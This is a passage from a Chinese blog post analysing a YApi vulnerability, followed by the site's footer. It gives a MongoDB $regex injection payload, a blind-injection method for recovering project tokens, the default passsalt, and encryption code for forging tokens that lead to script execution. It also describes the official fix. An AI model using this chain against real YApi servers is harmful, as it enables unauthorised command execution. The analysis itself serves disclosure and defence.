+  <span class="k">if</span><span class="p">(</span><span class="nx">tokens</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">tokens</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">tokens</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
+    <span class="nx">tokens</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">{</span>
+      <span class="nx">uid</span><span class="o">:</span> <span class="nx">tokens</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
+      <span class="nx">projectToken</span><span class="o">:</span> <span class="nx">tokens</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+  
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>如果没有解密出token，那么进入<code>getProjectIdByToken</code></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202194110042.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202194110042"
+	
+	
+></p>
+<p>进入findId方法，这里进行sql的操作，可以直接进行注入</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202194132849.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202194132849"
+	
+	
+></p>
+<p>利用盲注直接跑：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nt">&#34;token&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;$regex&#34;</span><span class="p">:</span> <span class="s2">&#34;.*&#34;</span><span class="p">}}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这样能绕过判断，进入up方法</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202194324731.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202194324731"
+	
+	
+></p>
+<p>在up方法里，如果你传入的id与你的token不匹配，那么就会返回405，但是这却证明了你的token是成功查询了的，所以在注入token的阶段：<strong>成功返回405，失败返回40011</strong></p>
+<p>这样跑出aes加密前的token：018e812fb0740d881087</p>
+<p>那么我们要获取能使用的token还得进行一个加密操作，通过上面的算法，我们可以知道，他的加密是这样实现的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="nx">aseEncode</span><span class="p">(</span><span class="nx">uid</span> <span class="o">+</span> <span class="s1">&#39;|&#39;</span> <span class="o">+</span> <span class="nx">token</span><span class="p">,</span> <span class="nx">yapi</span><span class="p">.</span><span class="nx">WEBCONFIG</span><span class="p">.</span><span class="nx">passsalt</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这个passsalt默认为<code>abcde</code>，所以我们可以爆破一下，uid从0开始爆破即可</p>
+<p>可以直接套用里面的nodejs来加密</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="kr">const</span> <span class="nx">aseEncode</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
+
+  <span class="c1">// 如下方法使用指定的算法与密码来创建cipher对象
+</span><span class="c1"></span>  <span class="kr">const</span> <span class="nx">cipher</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createCipher</span><span class="p">(</span><span class="s1">&#39;aes192&#39;</span><span class="p">,</span> <span class="nx">password</span><span class="p">);</span>
+
+  <span class="c1">// 使用该对象的update方法来指定需要被加密的数据
+</span><span class="c1"></span>  <span class="kd">let</span> <span class="nx">crypted</span> <span class="o">=</span> <span class="nx">cipher</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="s1">&#39;hex&#39;</span><span class="p">);</span>
+
+  <span class="nx">crypted</span> <span class="o">+=</span> <span class="nx">cipher</span><span class="p">.</span><span class="kr">final</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="nx">crypted</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>得到加密后的token，并且同时也拿到了他的id</p>
+<p>那么我们就可以利用id和token去写脚本，然后执行脚本了</p>
+<h1 id="漏洞修复">漏洞修复</h1>
+<p>漏洞的修复也就做了两个工作</p>
+<h2 id="sql注入的修复">sql注入的修复</h2>
+<p>因为我们盲注的时候，token的值为<code>{&quot;$regex&quot;:&quot;.*?&quot;}</code></p>
+<p>这个传入到这里的时候是一个Object而并非字符串</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202230436177.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202230436177"
+	
+	
+></p>
+<p>所以对他的修复限定他只能为字符串即可</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202230508877.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202230508877"
+	
+	
+></p>
+<h2 id="命令执行">命令执行</h2>
+<p>这里命令执行并没有直接从代码层面去修复，这个功能任然保留，但是默认是关闭的，需要网站管理员通过配置文件的修改才能开启</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202230637936.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221202230623079.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221202230623079"
+	
+	
+></p>
+<p>若有谬误，欢迎斧正</p>
+<p>参考链接：https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/cve-2022-40871/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[CVE-2022-40871] Dolibarr任意添加管理员与RCE漏洞分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/cve-2022-2633/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[CVE-2022-2633] WordPress All-in-One插件SSRF&#43;任意文件下载</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[代码审计]信呼OA2.3.1版本代码审计</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/thinkphp5.0.x%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce%E5%88%86%E6%9E%90/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[代码审计]ThinkPHP 5.0.x 变量覆盖导致的RCE分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[代码审计]Yii2反序列化漏洞分析 V2.0.38</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 Huamang
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        <span id="busuanzi_container_page_pv"> 阅读量 <span id="busuanzi_value_page_pv"></span> 次 </span>
+        <br>
+        
+        <span class="icp"><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021001334号</a></span>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+    </body>
+</html>
